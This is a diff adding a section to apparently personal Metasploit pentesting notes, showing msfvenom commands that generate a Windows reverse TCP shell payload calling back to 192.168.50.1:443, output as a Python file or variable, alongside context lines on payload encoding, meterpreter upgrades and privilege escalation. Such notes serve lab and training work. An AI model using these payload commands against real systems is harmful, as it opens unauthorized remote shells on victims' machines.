@@ -23,6 +23,19 @@ Then, you can something like `-e x86/shikata_ga_nai` when creating the payload.
 
 upgrade recent session to meterpreter session: `sessions -u -1`
 
+## controling the output of msfvenom
+
+A lot of the time, we are looking for a file as the payload. eg:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f python -o shell.py
+```
+
+However, if we want to assign the shell to a variable in a script, we can also do that with `-v nameOfVar`, such as:
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f python -v sh
+```
+which will give us a variable `sh` with the payload as hex. 
+
 ## Windows Priv Esc
 
 Using a meterpreter session of from payloads `windows/x64/shell_reverse_tcp` or `windows/shell/reverse_tcp`, you can do this script-kiddie move to privilege escalate:
